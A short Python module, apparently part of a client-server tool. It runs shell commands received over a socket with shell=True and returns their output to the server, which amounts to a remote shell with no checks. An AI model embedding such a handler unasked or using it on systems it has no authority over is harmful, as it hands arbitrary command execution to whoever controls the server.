import concurrent.futures, subprocess, typing

if typing.TYPE_CHECKING:
    from ..handler import ServerHandler

def _run_command(serverHandler: 'ServerHandler', message: bytes) -> None:
    output = subprocess.run(message.decode('UTF-8')[16:],
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        shell = True
    )

    if output.stdout:
        serverHandler.socketInstance.send_packet(b'exec_response 0 ' + output.stdout)
        return

    serverHandler.socketInstance.send_packet(b'exec_response 1 ' + output.stderr)

def run(serverHandler: 'ServerHandler', message: bytes) -> None:
    executor = concurrent.futures.ThreadPoolExecutor()
    future = executor.submit(_run_command, serverHandler, message)

    try: future.result(timeout = 8)
    except concurrent.futures.TimeoutError:
        serverHandler.socketInstance.send_packet('exec_response error')
        return
